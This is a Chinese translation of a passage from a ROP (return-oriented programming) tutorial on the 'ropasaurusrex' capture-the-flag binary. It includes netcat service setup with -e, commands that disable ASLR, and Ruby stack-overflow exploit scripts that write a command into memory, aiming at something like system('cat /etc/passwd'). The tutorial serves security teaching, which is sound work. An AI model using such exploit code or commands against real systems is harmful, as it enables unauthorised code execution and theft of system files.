    $ while true; do nc -vv -l -p 4444 -e ./ropasaurusrex; done
从现在开始，我们将local:4444作为我们攻击的目标，如果我们的EXP可行的话，我们将挑战实际的服务器。
使用下面的指令，你可以关闭ASLR:
    $ sudo sysctl -w kernel.randomize_va_space=0
(译者：或者使用下面的指令:
    echo 0 > /proc/sys/kernel/randomize_va_space 
    )
这条指令将使你的系统很容易被利用，所以我并不推荐在外做一个这样的实验环境。
下面是一些ruby代码和初始的EXP：
    require 'socket'
    $ cat ./sploit.rb
    s = TCPSocket.new("localhost", 4444)
    # Generate the payload
    payload = "A"*140 +
    [
    0x42424242,
    ].pack("I*") # Convert a series of 'ints' to a string
    s.write(payload)
    s.close()
(译者：推荐使用pwntools)
输入ruby ./splot.rb运行然后你会看到服务的崩溃：
然后你可以用gdb检查它是否崩溃在正确的位置：
好的，现在我们开始利用它！
**如何在ASLR上浪费时间**
* * *
我把这一节叫做浪费时间，因为在那个时候我并没有注意到ASLR是启动的。但是不管怎么说，ASLR的启用使这个问题变成了一个有益的难题。但是现在，我们不必关心ASLR，事实上在这篇文章里我们还没有给它定义，我将在文章的下一节介绍它。
好的，那么我们现在应该怎么办？我们有一个漏洞程序，还有libc共享库，下一步怎么做？
我们最终的目标是运行系统命令，因为stdin和stdout都可以和scoket挂钩。如果我们可以运行类似于system(“cat/etc/passwd”)这样的代码，那么我们就可以执行任何的代码了，但是做到这个我们还需要做两件事情：
1.在内存中的某个地方找到cat/etc/passwd
2.执行system()函数
**在内存中得到字符串**
* * *
在内存中得到字符串时间上需要两个步骤：
1.找到我们拥有写权限的内存
2.找到我们可以写入的函数
这些很难办吗？并不见得！首先找到我们可以读可以写的内存，最明显可以找到的地方就是.data段：
额，好吧，.data段只有8字节长并不够用。理论上，任何地址只要足够长，可写而且没有被占用都足够我们使用了。让我们用objdump
-x来看看，我发现一个叫做.dynamic的节区似乎满足我们的要求：
.dynamic节区保存动态链接的信息，我们不需要知道我们具体要选择哪一个地址，所以选择0x08049530来重写。
下一步是找到一个可以把我们的命令写到0x8049530地址的函数。相比较使用库函数而言，最方便的函数是可执行文件本身带的函数，这些函数不会因为系统的更换而改变，让我们看看我们这个程序有什么：
我们立刻可以获得read()和wirte()这两个函数，他们的用处很大！read()可以从socket读取数据并且写入内存，它的函数原型是这样的：
    ssize_t read(int fd, void *buf, size_t count);
这就是说，当你进入read函数时，栈会变成这个样子：
我们更新我们的EXP:
    $ cat sploit.rb
    require 'socket'
    s = TCPSocket.new("localhost", 4444)
    # The command we'll run
    cmd = ARGV[0] + ""
    # From objdump -x
    buf = 0x08049530
    # From objdump -D ./ropasaurusrex | grep read
    read_addr = 0x0804832C
    # From objdump -D ./ropasaurusrex | grep write
    write_addr = 0x0804830C
    # Generate the payload
    payload = "A"*140 +
    [
    cmd.length, # number of bytes
    buf, # writable memory
    0, # stdin
    0x43434343, # read's return address
    read_addr # Overwrite the original return
    ].reverse.pack("I*") # Convert a series of 'ints' to a string
    # Write the 'exploit' payload
    s.write(payload)
    # When our payload calls read() the first time, this is read
    s.write(cmd)
    # Clean up
    s.close()
再次运行EXP：
验证：
证实它崩溃在read()的返回地址，然后将我们的命令写入了0x08049503:
完美!
传送门
* * *
[**【技术分享】ropasaurusrex:ROP入门教程——STACK**](http://bobao.360.cn/learning/detail/3927.html)
[【技术分享】ropasaurusrex:ROP入门教程——DEP](http://bobao.360.cn/learning/detail/3923.html)（下）